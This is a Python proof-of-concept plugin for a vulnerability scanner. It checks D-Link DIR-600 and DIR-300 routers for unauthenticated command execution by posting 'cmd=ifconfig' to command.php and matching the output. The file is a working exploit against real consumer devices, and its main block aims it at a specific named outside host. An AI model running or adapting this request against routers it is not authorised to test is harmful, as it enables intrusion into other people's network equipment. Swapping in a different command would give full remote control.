#!/usr/bin/env python
# coding: UTF-8

#ref: http://www.s3cur1ty.de/m1adv2013-003
#_PlugName= DLink DIR-600 and DIR-300 命令执行漏洞
#_FileName_= Dlink_DIR-600_DIR_300_Command_Execution.py


import urlparse

from ..miniCurl import Curl
from ..t  import T


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url=arg+'command.php'
        postpayload='cmd=ifconfig'
        code,head,res,errcode,_ = curl.curl2(url,postpayload)
        if code==200 and "Ethernet  HWaddr" in res:
            output('Find Command_Execution:' + url,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  d-link  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='d-link Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/d-link/d-link_8b5f61283efcdee41c24cd85871032a4.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/d-link/d-link_8b5f61283efcdee41c24cd85871032a4.py
#/root/github/poccreate/codesrc/exp-1806.py